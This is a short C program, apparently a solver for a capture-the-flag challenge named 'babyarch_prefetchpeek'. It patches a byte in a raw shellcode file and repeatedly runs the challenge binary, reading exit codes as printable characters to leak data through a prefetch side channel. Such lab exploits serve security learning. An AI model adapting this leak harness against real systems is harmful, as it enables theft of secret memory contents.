# include <stdio.h>
# include <stdbool.h>
# include <x86intrin.h>
# include <stdlib.h>
# include <string.h>
# include <stdint.h>
# include <unistd.h>
# include <time.h>
void main()
{
	
	struct timespec *rqtp=(struct timespec *)malloc(sizeof(struct timespec));
	rqtp->tv_sec=0;
	rqtp->tv_nsec=1000;

	int ret;
	for(int j=58;j<59;j++)
	{
		FILE *ptr=fopen("babyprefetch-shellcode-raw","r");
		char buf[200];
		fread(buf,sizeof(char),200,ptr);
		buf[0x85]=j;
		fclose(ptr);
		FILE *ptr2=fopen("babyprefetch-shellcode-raw","w");
		fwrite(buf,sizeof(char),sizeof(buf)/sizeof(char),ptr2);
		fclose(ptr2);
		int cnt=0;
		nanosleep(rqtp,NULL);
		while(!(cnt>=32 && cnt<127))
		{
			ret=system("/challenge/babyarch_prefetchpeek < babyprefetch-shellcode-raw");
			if((int)WEXITSTATUS(ret)>126 || (int)WEXITSTATUS(ret)<32)
				continue;
			if(WIFEXITED(ret))
			{	
				cnt=(int)WEXITSTATUS(ret);
				printf("Exit code:%c\n",WEXITSTATUS(ret));
				//printf("Exit code:%d\n",5*WEXITSTATUS(ret));
			}
			nanosleep(rqtp,NULL);
		}
	}
}
